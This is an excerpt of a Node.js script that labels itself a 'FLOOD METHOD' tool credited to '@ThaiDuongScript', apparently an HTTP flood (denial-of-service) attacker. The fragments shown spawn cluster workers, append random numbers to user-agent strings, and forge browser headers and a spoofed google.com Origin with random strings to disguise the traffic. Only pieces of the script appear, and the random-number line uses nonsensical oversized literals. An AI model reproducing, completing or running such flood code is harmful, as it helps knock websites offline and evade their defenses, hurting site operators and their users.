...
if (cluster.isMaster) {
    console.clear()
    console.log(`[!] FLOOD METHOD | @ThaiDuongScript`.red);
    console.log(`--------------------------------------------`.gray);
...
const rt = Math.floor(Math.random() * 999999999999999999999999999999990999999999999999999) + 1000000000000000000000000000000000000000000000000;
const uap = u[Math.floor(Math.random() * u.length)] + " " + rt;
...
"sec-fetch-user": "?1",
 ...
 "Origin" : "https://www.google.com/" + "?page=" + randstr(15) + ":" + rt,
}
